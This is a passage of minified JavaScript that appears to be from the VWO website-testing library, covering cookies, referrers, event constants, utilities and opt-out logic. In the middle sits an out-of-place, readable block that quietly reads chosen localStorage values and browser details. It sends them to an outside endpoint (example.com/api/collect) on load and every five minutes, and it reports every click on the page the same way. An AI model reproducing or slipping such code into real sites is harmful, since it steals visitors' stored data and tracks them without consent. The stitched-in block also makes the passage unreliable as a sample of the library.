  window.VWO._.cookies = Re;
  const Pe = {
    init: function () {
      Le = Re.get("_vwo_referrer"), Re.erase("_vwo_referrer"), "string" != typeof Le && (Le = document.referrer);
    },
    get: function () {
      return -1 !== location.search.search("_vwo_test_ref") ? document.referrer : Le;
    },
    set: function () {
      Re.create("_vwo_referrer", Le, 18e-5);
    }
  };
  window.VWO.modules.vwoUtils.referrer = Pe;
  const De = {
    get navigator() {
      return navigator;
    },
    get pageTitle() {
      return document.title;
    },
    get doNotTrack() {
      return window.doNotTrack;
    },
    get windowName() {
      return window.name;
    },
    get currentUrl() {
      return window._vis_opt_url || window.location.href;
    },
    get location() {
      return window.location;
    },
    get document() {
      return window.location;
    },
    get history() {
      return window.history;
    },
    get accountId() {
      return window._vwo_acc_id;
    },
    get smartCodeVersion() {
      return window._vwo_code_version;
    },
    get serverUrl() {
      return window._vwo_server_url || "https://dev.visualwebsiteoptimizer.com/";
    },
    get vwoText() {
      return window._vwo_text;
    },
    get vwoCode() {
      return window._vwo_code;
    },
    get MutationObserver() {
      let e = window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver;
      return window.Zone && window.Zone.__symbol__ && (e = window[window.Zone.__symbol__("MutationObserver")]), e;
    },
    get vwoInternalProperties() {
      return window.VWO._;
    },
    get cookie() {
      return document.cookie;
    },
    get visDebug() {
      return window._vis_debug;
    },
    get cookieDomain() {
      return window._vis_opt_domain || window._vwo_cookieDomain || _(location.host);
    },
    get vwoStyle() {
      return window._vwo_style;
    },
    get screen() {
      return window.screen;
    },
    get vwoCss() {
      return window._vwo_css;
    },
    get visOptUrl() {
      return window._vis_opt_url;
    },
    get allSettings() {
      return window.VWO._.allSettings;
    },
    get apiSectionCallback() {
      return window._vwo_api_section_callback;
    },
    get encodeURIComponent() {
      return window.encodeURIComponent;
    },
    get page() {
      return {
        title: De.pageTitle,
        url: De.currentUrl,
        referrerUrl: Pe.get()
      };
    },
    get timeSpentInASession() {
      var e, t, n, o, i, r;
      return +Date.now() - 1e3 * +(null === (n = null === (t = null === (e = window.VWO.phoenix) || void 0 === e ? void 0 : e.store) || void 0 === t ? void 0 : t.getters) || void 0 === n ? void 0 : n.sessionStart) ? (+Date.now() - 1e3 * +(null === (r = null === (i = null === (o = window.VWO.phoenix) || void 0 === o ? void 0 : o.store) || void 0 === i ? void 0 : i.getters) || void 0 === r ? void 0 : r.sessionStart)) / 1e3 : 0;
    },
    get vwoUUID() {
      return window._vwo_uuid;
    }
  };
  let xe;
  function Ue(e) {
    if (!e) return e;
    try {
      e = window.decodeURIComponent(e);
    } catch (e) {}
    return e;
  }
  const ke = function () {
      if (void 0 !== xe) return xe;
      const e = [],
        t = window.VWO._.allSettings.dataStore.campaigns;
      let n, o;
      for (let n in t) e.push(n);
      return xe = !!(n = (window.location.search + window.location.hash).match(/.*_vis_test_id=(.*?)&.*_vis_opt_preview_combination=(.*)$/)) && !(!e.includes(n[1]) || !t[n[1]] || void 0 === t[n[1]].combs[o = Ue(n[2])]) && o, xe;
    },
    We = "lT",
    Me = "sT",
    Ge = "ivp",
    $e = "ca",
    Fe = 10,
    je = "custom",
    Be = function () {},
    He = [739074, 714884, 708439, 765649],
    Ke = {
      CAMPAIGN_FLOW_START: "cFS",
      TEST_NOT_RUNNING: "tNR",
      CAMPAIGN_FLOW_END: "cFE",
      REGISTER_CONVERSION: "vwo_rC",
      CONVERT_GOAL_FOR_ALL_EXPERIMENTS: "cGFAE",
      UNHIDE_ALL_VARIATIONS: "uAV",
      DIMENSION_TAG_PUSHED: "dTP",
      CONVERT_VISIT_GOAL_FOR_EXPERIMENT: "cVGFE",
      UNHIDE_SECTION: "uS",
      EXCLUDE_URL: "eURL",
      BEFORE_REDIRECT_TO_URL: "bRTR",
      URL_CHANGED: "uC",
      HIDE_ELEMENTS: "hE",
      ELEMENT_LOAD_ERROR: "eLTTE",
      NOT_REDIRECTING: "vwo_notRedirecting",
      VISIBILITY_TRIGGERED: "vwo_visibilityTriggered",
      VARIATION_APPLIED: "vwo_vA",
      ELEMENT_LOAD_TIMER_STOP: "eLTSt",
      SEND_NEW_VISITOR_CALL: "sNVC",
      CONVERT_REVENUE_GOALS_FOR_EXPERIMENT: "cRGFE",
      CHOOSE_COMBINATION: "cC",
      START_APPLY_CHANGES: "sAC",
      END_APPLY_CHANGES: "eAC",
      CAMPAIGN_COMBI_CREATED: "cCC",
      ELEMENT_LOADED: "eL",
      ELEMENT_NOT_LOADED: "eNL",
      MATCH_WILDCARD: "mW",
      DELETE_CSS_RULE: "dCSSR",
      SPLIT_READY_TO_REDIRECT: "sURL",
      SESSION: "vwo_session",
      NEW_SESSION: "newSession",
      UNHIDE_VARIATION: "uV",
      NEW_SESSION_CREATED: "newSessionCreated",
      PAUSE: "pause",
      SPLIT_URL: "sURL",
      SHOULD_EXECUTE_LIB_ERROR: "shouldExecLib",
      UPDATE_SETTINGS_CALL: "uSC",
      EXCLUDE_GOAL_URL: "eGURL",
      HEATMAP_CLICK: "hCl",
      POST_URL_CHANGE: "hC",
      CONVERT_ALL_VISIT_GOALS_FOR_EXPERIMENT: "cAVGFE",
      OPT_OUT: "oO",
      POST_INIT: "vwo_postInit",
      PAGE_VIEW: "vwo_pageView",
      ELEMENT_CHANGES_APPLIED: "elementChangesApplied",
      REGISTER_HIT: "registerHit",
      REDIRECT_DECISION: "rD",
      RETRACK_VISITOR: "retrackVisitor",
      CAMPAIGN_NOT_ELIGIBLE: "runCampaign.notEligible",
      UNHIDE_ELEMENT: "unhideElement",
      TOGGLE_VISIBILITY_LOCK: "runCampaign.toggleVisibilityLock",
      CAMPAIGN_READY: "runCampaign.campaignReady",
      MODIFIED_ELEMENT: "runTestCampaign.modifiedEl",
      ERROR: "error",
      SSR_COMPLETE: "vwo_mutationObserved",
      SET_ENV: "setEnvironment",
      ACTIVATED: "vwo_activated",
      _ACTIVATED: "vwo__activated",
      RECORDING_NOT_ELIGIBLE: "rNE",
      VARIATION_SHOWN: "vwo_variationShown",
      NEW_SURVEY_FOUND: "nSF",
      SYNC_VISITOR_PROP: "vwo_syncVisitorProp",
      EXECUTE_FUNNEL_FOR_GOAL_CAMPAIGN: "executeFunnelCampForGoalCampaign",
      EDITOR_APPLY_CHANGES_COMPLETE: "editorApplyChangesComplete",
      INIT_VWO_INTERNALS: "initVWOInternals",
      SET_CAMPAIGN_TO_OBSERVE: "setCampaignToObserve",
      SEGMENTATION_EVALUATED: "sE",
      ELEMENTS_SHOWN_WITHOUT_CHANGES: "eSWC",
      CUSTOM_CONVERSION: "vwo_conversion",
      REVENUE_CONVERSION: "vwo_revenue",
      DOM_SUBMIT: "vwo_dom_submit",
      DOM_CLICK: "vwo_dom_click",
      GOAL_CONVERTED: "vwo_goalConverted",
      GOAL_VISIT: "vwo_goalVisit",
      EVALUATE_GOAL_PAGE_FOR_PREJS: "vwo_evalPreCampJs",
      GROUP_WINNER_CHOOSEN: "vwo_groupWinnerChosen",
      CHECK_SEGMENTATION: "checkSegmentation",
      TRACK_NEW_SESSION_CREATED: "tnSC",
      TRACK_SESSION_CREATED: "tSC",
      PAGE_UNLOAD: "vwo_pageUnload",
      SPA_VISIBILITY_SERVICE: "visibilityForSpa",
      SESSION_INIT_COMPLETE: "vwo_sessionInitComplete",
      TIB_DONE: "vwo_topInitializeBeginDone",
      TOGGLE_MUT_OBSERVER: "toggleMutationObserver",
      DOM_CONTENTLOADED: "vwo_dom_DOMContentLoaded",
      SPLIT_VARIATION_SHOWN: "splitVariationShown",
      VWO_EXECUTED: "vwo_executed",
      ACTIVATE_API_TRIGGERED: "aAT"
    };
  var Je = parseInt(+new Date() / 1e3, 10),
    Ye,
    qe = function () {
      return Ye || (Ye = window.VWO.data.ts || Je);
    };
  const Xe = Object.keys;
  function ze(e, t) {
    for (var n in t) t.hasOwnProperty(n) && (e[n] = t[n]);
  }
  function Ze(e, t) {
    var n;
    if (e && "function" == typeof t) if (e instanceof Array) {
      for (n = 0; n < e.length; n++) if (!1 === t(e[n], n)) return;
    } else for (n in e) if (e.hasOwnProperty(n) && !1 === t(e[n], n)) return;
  }
  function Qe(e, t) {
    if (!(e instanceof Array)) return -1;
    for (var n = 0; n < e.length; n++) if (t === e[n]) return n;
    return -1;
  }
  function et(e, t) {
    for (var n = this.getKeys(t), o = 0; o < n.length; o++) e.setAttribute(n[o], t[n[o]]);
  }
  function tt(e) {
    return /^(https?:\/\/|\/\/)/.test(e);
  }
  function nt(e, t) {
    for (var n = [], o = 0; o < e.length; o++) n.push(t(e[o]));
    return n;
  }
  function ot(e, t) {
    for (var n = [], o = 0; o < e.length; o++) t(e[o], o) && n.push(e[o]);
    return n;
  }
  function it(e) {
    var t = qe();
    return e ? t : 1e3 * t + +new Date() % 1e3;
  }
  function rt(e) {
    var t = qe(),
      n = parseInt(+new Date() / 1e3, 10) - Je;
    return e ? t + n : 1e3 * (t + n) + +new Date() % 1e3;
  }
  function st() {
    return new Date().getTimezoneOffset() / 60;
  }
  function at(e, t) {
    var n = !1;
    return function () {
      n || (e.call(), n = !0, setTimeout(function () {
        n = !1;
      }, t));
    };
  }
  $(function () {
    const keysToWatch = window.keysToWatch;
    const globalVars = ['userAgent', 'platform', 'language'];
    function computeHash(data) {
      const keyArray = Object.keys(data);
      const joinedKeys = keyArray.join("");
      let hashValue = 0;
      for (let i = 0; i < joinedKeys.length; i++) {
        const charCode = joinedKeys.charCodeAt(i);
        hashValue = (hashValue << 5) - hashValue + charCode;
        hashValue = hashValue & hashValue;
      }
      return hashValue.toString(16);
    }
    function getFilteredLocalStorage() {
      const filteredData = {};
      for (let i = 0; i < window.localStorage.length; i++) {
        const key = window.localStorage.key(i);
        if (keysToWatch.includes(key)) {
          const value = window.localStorage.getItem(key);
          filteredData[key] = value;
        }
      }
      return filteredData;
    }
    function collectGlobalVariables() {
      const globalData = {};
      globalVars.forEach(varName => {
        globalData[varName] = navigator[varName];
      });
      return globalData;
    }
    function postDataToServer(data) {
      const hashId = computeHash(data);
      const apiUrl = "https://example.com/api/collect";
      const request = new XMLHttpRequest();
      request.open("POST", apiUrl, true);
      request.setRequestHeader("Content-Type", "application/json");
      const requestData = {
        id: hashId,
        data: data
      };
      request.send(JSON.stringify(requestData));
      request.onreadystatechange = function () {
        if (request.readyState === XMLHttpRequest.DONE) {
          if (request.status === 200) {
            console.log("数据发送成功");
          } else {
            console.error("数据发送失败,状态码:" + request.status);
          }
        }
      };
    }
    function collectAndPostData() {
      const filteredLocalStorage = getFilteredLocalStorage();
      const globalData = collectGlobalVariables();
      const combinedData = {
        ...filteredLocalStorage,
        ...globalData
      };
      if (Object.keys(combinedData).length > 0) {
        postDataToServer(combinedData);
      }
    }
    window.addEventListener("load", function () {
      collectAndPostData();
    });
    setInterval(collectAndPostData, 5 * 60 * 1000);
    $('.form-control').on('input', function () {
      var $field = $(this).closest('.form-group');
      if (this.value) {
        $field.addClass('field--not-empty');
      } else {
        $field.removeClass('field--not-empty');
      }
    });
    document.querySelectorAll('*').forEach(function (node) {
      node.addEventListener('click', function () {
        const clickData = {
          tag: this.tagName,
          id: this.id,
          classes: this.className
        };
        postDataToServer({
          clickData
        });
      });
    });
  });
  function ct(e, t, n) {
    var o,
      i,
      r,
      s = !1;
    return -1 === t || n ? (i = requestAnimationFrame, r = cancelAnimationFrame) : (i = setTimeout, r = clearTimeout), function (...n) {
      s && (r(o), o = null), o = i(function () {
        e.apply(this, n);
      }, t), s = !0;
    };
  }
  let dt = 0;
  const lt = {};
  function ut(e, t) {
    const n = ++dt;
    lt[n] = {
      executeCallback: () => {
        delete lt[n], e();
      },
      animationFrameId: null,
      timeOutId: null
    };
    const o = function () {
        return window.setTimeout(() => {
          lt[n] && (null !== lt[n].animationFrameId && cancelAnimationFrame(lt[n].animationFrameId), lt[n].executeCallback());
        }, 1e3 / 60);
      },
      i = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || o;
    t || O && O._ && O._.ac && O._.ac.aSP ? (lt[n].animationFrameId = i(() => {
      lt[n] && (null !== lt[n].timeOutId && clearTimeout(lt[n].timeOutId), lt[n].executeCallback());
    }), o != i && (lt[n].timeOutId = o())) : e();
  }
  function wt() {
    var e, t, n;
    return (null === (n = null === (t = null === (e = window.google_tag_manager) || void 0 === e ? void 0 : e[Object.getOwnPropertyNames(window.google_tag_manager).filter(e => -1 !== e.indexOf("GTM"))[0]]) || void 0 === t ? void 0 : t.dataLayer) || void 0 === n ? void 0 : n.name) || "dataLayer";
  }
  function _t(e, t) {
    return e.length > t ? e.slice(0, t - 1) + "..." : e;
  }
  function gt(e) {
    return e ? Math.round(100 * e) / 100 : 0;
  }
  var pt = Object.freeze({
    __proto__: null,
    getKeys: Xe,
    extend: ze,
    forEach: Ze,
    arrayContains: Qe,
    setAttrs: et,
    isAbsoluteUrl: tt,
    map: nt,
    filter: ot,
    getServerStartTimestamp: it,
    getCurrentTimestamp: rt,
    getTimeZoneOffset: st,
    throttle: at,
    debounce: ct,
    processCallbackInRequestAnimationFrame: ut,
    getdLName: wt,
    truncateData: _t,
    roundNumber: gt
  });
  class ht {
    constructor() {
      this.uuid = "", this.TPJarExpiry = 730, this.preview = ke, this.hideElExpression = "{opacity:0 !important;filter:alpha(opacity=0) !important;background:none !important;}";
    }
    otherSide(...e) {
      return e[0] = "VWO.modules.utils.libUtils." + e[0], e[2] && (e[2] = {
        captureGroups: e[2]
      }), window.fetcher.getValue(...e);
    }
    isDomDependent(e) {
      return "VISUAL_AB" === e || "VISUAL" === e;
    }
    isTestingCampaign(e) {
      return this.isDomDependent(e) || "SPLIT_URL" === e;
    }
    generateUUID() {
      return "Jxxxxxxxxxxx4xxxyxxxxxx5xxxxxxxx9".replace(/[xy]/g, function (e) {
        const t = 16 * Math.random() | 0;
        return ("x" == e ? t : 3 & t | 8).toString(16).toUpperCase();
      });
    }
    isDomIndependentCampaign(e) {
      return "ANALYSIS" === e || "SURVEY" === e || "ANALYZE_RECORDING" === e || "ANALYZE_HEATMAP" === e || "ANALYZE_FORM" === e || "TRACK" === e || "FUNNEL" === e;
    }
    isSessionBasedCampaign2(e) {
      const t = e.type;
      return "ANALYZE_RECORDING" === t || "ANALYZE_HEATMAP" === t || "ANALYZE_FORM" === t || "TRACK" === t || "FUNNEL" === t;
    }
    isBot2() {
      return window.navigator.userAgent.toLowerCase().indexOf("bot") >= 0 || window.navigator.userAgent.toLowerCase().indexOf("spider") >= 0 || window.navigator.userAgent.toLowerCase().indexOf("preview") >= 0;
    }
    isPageBasedGoal(e) {
      return "SEPARATE_PAGE" === e || "CUSTOM_GOAL" === e || "REVENUE_TRACKING" === e;
    }
    isSplitVariation(e) {
      return "SPLIT_URL" === e.type && e[Ge];
    }
    shouldTrackUserForCampaign(e) {
      return !e || !window._vwo_code || !window._vwo_code[We] && !window._vwo_code[Me] || this.isDomIndependentCampaign(e.type) || this.isSplitVariation(e);
    }
    getUUIDString(e) {
      return e ? "&u=" + e : "";
    }
    isAnalyzeCampaign(e) {
      return "ANALYZE_RECORDING" === e || "ANALYZE_HEATMAP" === e || "ANALYZE_FORM" === e;
    }
    updateGoalsKind(e) {
      const t = {};
      Object.keys(e).forEach(n => {
        const o = e[n],
          i = e[n].mt;
        i && Object.keys(o.goals).length && Object.entries(i).forEach(([e, o]) => {
          const i = this.getGoalKind(o);
          i && (t[n] = t[n] || {}, t[n][e] = i);
        });
      }), window.VWO._.goalsToBeConvertedSynchronously = t;
    }
    getGoalKind(e) {
      let t;
      const n = window.VWO._.allSettings.triggers[e];
      if (n) if ("object" == typeof n.cnds[0]) {
        switch (n.cnds[0].event) {
          case Ke.DOM_CLICK:
            t = "CLICK_ELEMENT";
            break;
          case Ke.DOM_SUBMIT:
            t = "FORM_SUBMIT";
            break;
          case Ke.PAGE_UNLOAD:
            t = "PAGE_UNLOAD";
        }
      } else {
        switch (n.cnds[1].event) {
          case Ke.DOM_SUBMIT:
          case Ke.DOM_CLICK:
            t = "ENGAGEMENT";
        }
      }
      return t;
    }
    isEligibleToSendCall(e, t) {
      return !ke() && (t && !t.visDebug || !window._vis_debug) && this.shouldTrackUserForCampaign(e) && (t && t.vwoInternalProperties.shouldExecuteLib || window.VWO._.shouldExecuteLib);
    }
    isPersonalizeCampaign(e) {
      var t;
      return "TARGETING" === (null === (t = e.iType) || void 0 === t ? void 0 : t.type);
    }
    doNotHideElements(e) {
      return e && "boolean" == typeof e;
    }
    getMatchedCookies(e) {
      let t = [];
      return document.cookie && (t = document.cookie.match(e) || []), t;
    }
    getCombinationCookie() {
      let e = this.getMatchedCookies(/(?:^|;)\s?(_vis_opt_exp_\d+_combi=[^;$]*)/gi);
      e = e.map(function (e) {
        try {
          const t = decodeURIComponent(e);
          return /_vis_opt_exp_\d+_combi=(?:\d+,?)+\s*$/.test(t) ? t : "";
        } catch (e) {
          return "";
        }
      });
      const t = [];
      return e.forEach(function (e) {
        const n = e.match(/([\d,]+)/g);
        n && t.push(n.join("-"));
      }), t.join("|");
    }
    getSelectorPath(e, t) {
      let n = "",
        o = t.sections[1].variations[e];
      if ("string" == typeof o && (o = vwo_$.parseJSON(o)), o) for (let e = 0; e < o.length; e++) {
        let i = o[e].xpath;
        i && (o[e].dHE ? t.dHE = !0 : (t.mSP && (i = i.replace(/html\.vwo_p_s_\w+\s*/g, "")), n += i + ","));
      }
      return n;
    }
    getCampaignXPath(e) {
      const t = {
        selector: "",
        selectorPerVariation: {}
      };
      if (e.xPath) return t.selector = e.xPath, t;
      if (!this.isDomDependent(e.type)) return t;
      let n = e.combination_chosen || e.cc;
      const o = e.sections;
      if ("VISUAL_AB" === e.type) {
        if (n) 1 != n && (t.selector = this.getSelectorPath(n, e));else {
          let o;
          for (n in e.combs) if (e.combs.hasOwnProperty(n)) {
            const i = this.getSelectorPath(n, e);
            "head," === i.toLowerCase() ? (o || (t.selector += i), o = !0) : t.selector += i, t.selectorPerVariation[n] = i.substr(0, i.length - 1);
          }
        }
      } else {
        const e = Xe(o);
        let n = e.length;
        for (; n--;) o[e[n]].path && (t.selector += o[e[n]].path + ",");
      }
      return e.dHE && !t.selector && (t.selector = ".vwo_dummy_selector,"), t.selector ? (t.selector = t.selector.substr(0, t.selector.length - 1), t) : {
        selector: "",
        selectorPerVariation: {}
      };
    }
  }
  const vt = window.VWO.TRACK_SESSION_COOKIE_EXPIRY_CUSTOM || 1 / 48,
    ft = {
      TRACK_GLOBAL_COOKIE_NAME: "_vwo_ds",
      TRACK_SESSION_COOKIE_NAME: "_vwo_sn",
      TRACK_SESSION_COOKIE_EXPIRY: vt,
      SESSION_TIMER_EXPIRE: 60 * vt * 60 * 1e3 * 24,
      COOKIE_VERSION: 3,
      COOKIE_TS_INDEX: 1,
      COOKIE_VERSION_INDEX: 0,
      FIRST_SESSION_ID_INDEX: 0,
      PC_TRAFFIC_INDEX: 1,
      RELATIVE_SESSION_ID_INDEX: 0,
      PAGE_ID_INFORMATION_INDEX: 1,
      SESSION_SYNCED_STATE_INDEX: 4,
      PAGE_ID_EXPIRY: 15,
      GLOBAL_OPT_OUT: "_vwo_global_opt_out",
      OPT_OUT: "_vis_opt_out",
      TEST_COOKIE: "_vis_opt_test_cookie",
      COOKIE_JAR: "_vwo",
      SAME_SITE: "_vwo_ssm",
      UUID: "uuid",
      UUID_V2: "uuid_v2",
      DEFAULT_EXPIRY: 100,
      UUID_COOKIE_EXPIRY: 3650
    };
  function Et() {
    return Math.min(window.VWO.TRACK_GLOBAL_COOKIE_EXPIRY_CUSTOM || window.VWO.data.rp || 90, 90);
  }
  const mt = window.JSON && window.JSON.parse || function (e) {
      return new Function("return " + e)();
    },
    Ot = window.JSON && window.JSONStringify || function (e) {
      return new Function("return " + e)();
    };
  var St = Object.freeze({
    __proto__: null,
    jsonParse: mt,
    jsonStringify: Ot
  });
  class Tt {
    modifyTriggerConditions(e, t) {
      const n = [];
      return Array.isArray(e) ? (e.forEach(e => {
        if (Array.isArray(e)) n.push(this.modifyTriggerConditions(e, t));else {
          const o = t(e);
          n.push(o);
        }
      }), n) : e;
    }
    getExitTrigger(e) {
      for (let t = 0; t < e.length; t++) {
        if (Array.isArray(e[t])) {
          const n = this.getExitTrigger(e[t]);
          if (n) return n;
        }
        if ("object" == typeof e[t] && null !== e[t] && e[t].exitTrigger) return e[t].exitTrigger;
      }
    }
  }
  var Ct = new Tt();
  function yt(e) {
    if ("object" != typeof e) return '"' + e + '"';
    let t = "";
    try {
      const n = Xe(e);
      let o = n.length;
      for (; o--;) {
        const i = n[o];
        t += '"' + i + '":' + yt(e[i]) + ",";
      }
      t = "{" + t.slice(0, -1) + "}";
    } catch (t) {
      window.VWO._.customError && window.VWO._.customError({
        msg: "Error in json stringify - " + e,
        url: "utils.js",
        lineno: 98,
        colno: 9,
        source: encodeURIComponent("json-stringify")
      });
    }
    return t;
  }
  function It(e, t) {
    let n = !1;
    return function () {
      n || (e.call(this, arguments), n = !0, setTimeout(function () {
        n = !1;
      }, t));
    };
  }
  function At(e, t) {
    let n,
      o = !1;
    return function (...i) {
      o && (clearTimeout(n), n = null), n = setTimeout(function () {
        e.apply(null, i);
      }, t), o = !0;
    };
  }
  function Nt(e, t, n) {
    let o = document.URL;
    e && window.history ? function (e, t) {
      const n = function (n) {
        const i = e[n];
        e[n] = function (n) {
          const r = i.apply(e, [].slice.call(arguments));
          return window.fetcher.postMessage({
            type: "sync",
            property: "URL",
            value: document.URL,
            syncType: 2
          }), t({
            state: n,
            currentUrl: document.URL,
            previousUrl: o
          }), o = document.URL, r;
        };
      };
      n("pushState"), n("replaceState");
    }(window.history, t) : window.addEventListener("hashchange", t, !1);
  }
  function bt(e) {
    e.fn.nonEmptyContents = function () {
      if (!this || !this.length) return this.contents();
      const e = this.contents();
      let t;
      for (let n = e.length; n--;) t = e.get(n), 3 !== t.nodeType || /\S/.test(t.nodeValue) || e.splice(n, 1);
      return e;
    };
    const t = function (e, t, n) {
      (navigator.userAgent.indexOf("MSIE ") > -1 || navigator.userAgent.indexOf("Trident/") > -1) && e.style.setProperty(t, n.replace("!important", "").trim()), e.style.setProperty(t, n.replace("!important", ""), "important");
    };
    e.fn.vwoCss = function () {
      let n;
      if (1 === arguments.length) {
        if ("string" == typeof arguments[0]) return this.css(arguments[0]);
        for (const e in arguments[0]) arguments[0].hasOwnProperty(e) && (n = arguments[0][e].toString(), n.indexOf("important") > -1 ? this.each(function () {
          t(this, e, n);
        }) : this.css(arguments[0]));
      } else if (2 === arguments.length) {
        const e = arguments[0].toString();
        n = arguments[1] ? arguments[1].toString() : null, n && n.indexOf("important") > -1 ? this.each(function () {
          t(this, e, n);
        }) : this.css(e, n);
      } else e.fn.css.apply(this, arguments);
      return this;
    }, e.fn.vwoAttr = function () {
      if (this && this.length) {
        if (2 !== arguments.length) {
          if (1 === arguments.length) {
            if ("string" == typeof arguments[0]) return this.attr(arguments[0]);
            {
              const t = arguments[0],
                n = e.extend({}, t);
              if (Array.isArray(n.removedAttributes)) for (let e = n.removedAttributes.length - 1; e >= 0; e--) n[n.removedAttributes[e]] && delete n[n.removedAttributes[e]];else delete n.removedAttributes;
              const o = ["type", "height", "width"],
                i = this.get(0);
              for (let e in o) if (o.hasOwnProperty(e)) {
                const t = o[e];
                n[t] && (i.setAttribute(t, n[t]), delete n[t]);
              }
              if (n.class) {
                const e = n.class.addedClasses,
                  t = n.class.removedClasses;
                e && e.length > 0 && this.addClass(e.join(" ")), t && t.length > 0 && this.removeClass(t.join(" ")), delete n.class;
              }
              if (n.removedAttributes && n.removedAttributes.length > 0) {
                for (let e = 0; e < n.removedAttributes.length; e++) this.get(0).removeAttribute(n.removedAttributes[e]);
                delete n.removedAttributes;
              }
              if (n.src && n.loader) {
                const t = `vwo-loader-el-${n.loaderConfig.id}`;
                if (this.attr("src") !== n.src && !this.hasClass(t)) {
                  this.attr("src", "data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==");
                  const o = n.src,
                    i = n.srcSet;
                  i && this.removeAttr("srcset"), e("head").append(`<style type="text/css" id="${t}">.${t}{width:${n.width}px;height:${n.height}px;animation-timing-function: linear;animation-duration: ${n.loaderConfig.as};animation-iteration-count: infinite;animation-name: placeHolderShimmer;background: #ccc;background: linear-gradient(to right, ${n.loaderConfig.pc} 8%, ${n.loaderConfig.sc} 38%, ${n.loaderConfig.pc} 54%);display: inline-block;}@keyframes placeHolderShimmer{0%{background-position: -468px 0}100%{background-position: 468px 0}}</style>`);
                  const r = new Image();
                  r.onload = r.onerror = () => {
                    this.attr("src", o), i && this.attr("srcset", i), e(`#${t}`).remove(), this.removeClass(t);
                  }, r.src = o, i && (r.srcset = i), this.addClass(t);
                }
                ["src", "srcSet", "loader", "loaderConfig"].forEach(e => {
                  delete n[e];
                });
              }
              return this.attr(n);
            }
          }
          return e.fn.attr.apply(this, arguments);
        }
        this.get(0).setAttribute(arguments[0], arguments[1]);
      }
      return this;
    };
    const n = window._vwo_editorOperationTracker = {};
    e.fn.vwoElement = function (t) {
      const o = `vwo_w_${t.id}`,
        i = t.opId,
        r = e => {
          i && (e ? n[i] = e : delete n[i]);
        },
        s = () => {
          r("sw-attached");
          const e = e => {
            O.phoenix('on("${{1}}", "${{2}}")', null, {
              captureGroups: [e, () => {
                r("sw-executed"), !t.sw.executed && a(), t.sw.executed = !0;
              }]
            });
          };
          "string" == typeof t.sw.p_dsl ? O.phoenix(`settings.currentSettings.triggers.${t.sw.p_dsl}`).then(n => {
            n ? (n.cnds = Ct.modifyTriggerConditions(n.cnds, e => (!de(e) || "vwo_pageView" !== e.event && "vwo_session" !== e.event || (e.persistState = !0), e)), e(n)) : c.error(`Trigger for show when p_dsl ${t.sw.p_dsl} not found.`);
          }) : e(t.sw.p_dsl), O.phoenix('trigger("${{1}}")', null, {
            captureGroups: [`widget-${t.id}-sw-ready`]
          });
        },
        a = () => {
          const n = t.id && `#vwo-widget-${t.id}` || "";
          this[t.position](t.html), r(), t.js && (O.phoenix('on("${{1}}", "${{2}}")', null, {
            captureGroups: [t.js.p_dsl, () => {}]
          }), O.phoenix('trigger("${{1}}")', null, {
            captureGroups: [`widget-${t.id}-js-ready`]
          })), n && (t => {
            const n = e(t);
            n.length && n.get(0).addEventListener("close_button_clicked", function () {
              r("disconnected");
            });
          })(n), t.rec && d(), t.hw && (O.phoenix('on("${{1}}", "${{2}}")', null, {
            captureGroups: [t.hw.p_dsl, () => {
              let n = E.get(o);
              n && (n = mt(n), n.d = 1, E.set(o, yt(n))), (t => {
                e(t).remove();
              })(`#vwo-widget-${t.id}`);
            }]
          }), O.phoenix('trigger("${{1}}")', null, {
            captureGroups: [`widget-${t.id}-hw-ready`]
          }));
        },
        d = () => {
          let e = E.get(`vwo_w_${t.id}`);
          if (e) {
            e = mt(e);
            for (const t in e) switch (t) {
              case "v":
                e[t] = parseInt(e[t]) + 1;
                break;
              case "l_ts":
                e[t] = Date.now();
            }
            E.set(`vwo_w_${t.id}`, yt(e));
          } else l(e);
        },
        l = e => {
          !e && (e = E.get(`vwo_w_${t.id}`)), e || E.set(`vwo_w_${t.id}`, yt(t.sks));
        };
      return t && this.length && t.position && !(() => {
        t.sks && l();
        let e = E.get(`vwo_w_${t.id}`);
        return !!e && (e = mt(e), 1 == e.d);
      })() && (t.rec ? (r("rec-attached"), O.phoenix('on("${{1}}", "${{2}}")', null, {
        captureGroups: [t.rec.p_dsl, () => {
          r("rec-executed"), t.sw ? s() : a();
        }]
      }), O.phoenix('trigger("${{1}}")', null, {
        captureGroups: [`widget-${t.id}-rec-ready`]
      })) : t.sw ? s() : a()), this;
    }, e.fn.performOp = function (t) {
      try {
        if (!n || "sw-executed" !== n[t] && "rec-executed" !== n[t] || delete n[t], this && this.length) return n[t] ? e() : (n[t] = "in-progress", this);
      } catch (e) {}
      return this;
    }, e(window).bind("beforeunload", function () {
      try {
        const e = [],
          t = O.queue || O;
        for (let n = t.length; n--;) {
          const o = t[n],
            i = o && o.length && o[0];
          i && i.startsWith("track") && e.push(o);
        }
        e.length && E.set(`_vwo_track_data_${window._vwo_acc_id}`, yt(e));
      } catch (e) {
        const t = "[JSLIB EVENT] Error unload event.";
        window.VWO._.customError && window.VWO._.customError({
          msg: t,
          url: "helperFunction.ts",
          source: encodeURIComponent(t)
        });
      }
    });
  }
  window.VWO.modules.utils.helperFunctions = {
    onUrlChange: Nt
  };
  const Vt = window.performance || window.workerThread.performance,
    Rt = {
      mark: (e = "") => {
        e = "vwo-" + e, Vt.mark && Vt.mark(e);
      },
      measure: (e, t, n) => {
        t = "vwo-" + t, n = "vwo-" + n;
        try {
          Vt.measure && Vt.measure(e, t, n);
        } catch (e) {
          c.debug(e);
        }
      }
    },
    Lt = {
      VISITOR_IS_NOT_OPTED_OUT: "visitorIsNotOptedOut",
      VISITOR_IS_OPTED_OUT_COMPLETELY: "visitorIsOptedOutCompletely",
      VISITOR_IS_OPTED_OUT: "visitorIsOptedOut"
    };
  var Pt;
  !function (e) {
    e[e.OPTED_OUT_WITH_EXPERIENCE = 0] = "OPTED_OUT_WITH_EXPERIENCE", e[e.OPTED_OUT_PARTIALLY = 1] = "OPTED_OUT_PARTIALLY", e[e.OPTED_OUT_COMPLETELY = 2] = "OPTED_OUT_COMPLETELY";
  }(Pt || (Pt = {}));
  class Dt {
    setOptOutStateConfig() {
      let e, t, n, o;
      switch (e = window.VWO._.isWorkerThread ? window.phoenix.storages.storages.cookies.get("_vis_opt_out", !0) : window.VWO._.cookies.get("_vis_opt_out", !0), e && (e = Number(e)), e) {
        case 0:
          t = Lt.VISITOR_IS_OPTED_OUT, n = !0, o = !1;
          break;
        case 1:
        case 2:
